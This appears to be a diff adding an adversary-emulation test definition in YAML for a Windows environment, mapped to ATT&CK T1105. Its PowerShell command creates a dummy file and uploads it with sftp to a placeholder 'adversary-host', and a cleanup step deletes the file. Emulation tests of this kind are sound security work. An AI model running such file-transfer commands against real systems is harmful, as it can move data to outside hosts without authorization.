@@ -1,0 +1,24 @@
+---
+- id: 5dc66b14bf49afbcfb06bf552fa01f43
+  name: Windows push file using sftp.exe
+  description: 'This test simulates pushing files using SFTP on a Windows environment.
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: '$folderPath = "C:\temp"; if (-Not (Test-Path -Path $folderPath))
+          {;     New-Item -Path $folderPath -ItemType Directory; }; $filePath = Join-Path
+          -Path $folderPath -ChildPath "T1105.txt"; New-Item -Path $filePath -ItemType
+          File -Force; Write-Output "File created: $filePath"; echo "put C:\temp\T1105.txt"
+          | sftp adversary@adversary-host:/tmp'
+        payloads: []
+        cleanup: '$filePath = Join-Path -Path "C:\temp" -ChildPath "T1105.txt"; Remove-Item
+          -Path $filePath -Force; Write-Output "File deleted: $filePath"'
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
